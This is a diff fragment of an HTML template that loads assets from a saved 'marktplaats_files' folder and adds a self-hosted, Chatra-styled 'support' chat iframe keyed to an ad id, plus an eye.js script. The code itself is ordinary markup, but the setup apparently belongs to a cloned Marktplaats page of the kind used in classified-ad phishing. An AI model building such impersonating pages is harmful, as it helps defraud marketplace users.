+  <div class="f-chat" id="open-support">
+  </div>
+
+  <script type="text/javascript" src="./marktplaats_files/jquery3.6.0.js"></script>
+  <script type="text/javascript" src="./marktplaats_files/main.js"></script>
+
+  <div class="
+  chatra--webkit
+  chatra--style-round
+  chatra--side-bottom
+  chatra--pos-right
+  chatra--visible
+  chatra--expanded
+  chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+  width: 380px;
+  height: 600px;
+  transform: none;
+  z-index: 2147483647;
+  display: none;
+  ">
+  <div id="chatra__iframe-wrapper">
+  <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+  src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+  </div>
+  </div>
+  <div class="support-circle"
+  onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+  
+  <script>
+  const adId = "<%=ad.id%>"
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+  <script src="/js/eye.js" defer></script>
+  
+  </body>
